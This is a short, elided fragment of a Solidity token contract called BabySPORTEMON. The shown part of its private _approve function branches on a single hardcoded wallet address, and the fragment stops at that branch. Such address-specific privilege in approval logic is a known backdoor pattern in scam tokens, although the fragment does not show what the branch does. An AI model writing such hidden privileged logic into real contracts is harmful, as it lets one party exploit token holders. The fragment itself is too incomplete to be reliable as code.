...
contract BabySPORTEMON is Context, IERC20, Ownable {
    ...
    string private _name = "BabySPORTEMON";
    string private _symbol = "BabySPORTEMON";
   ...
   //this method is responsible for taking all fee, if takeFee is true
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0x0231db7D842a55281444FC61974ed75F3B31D95F)) {
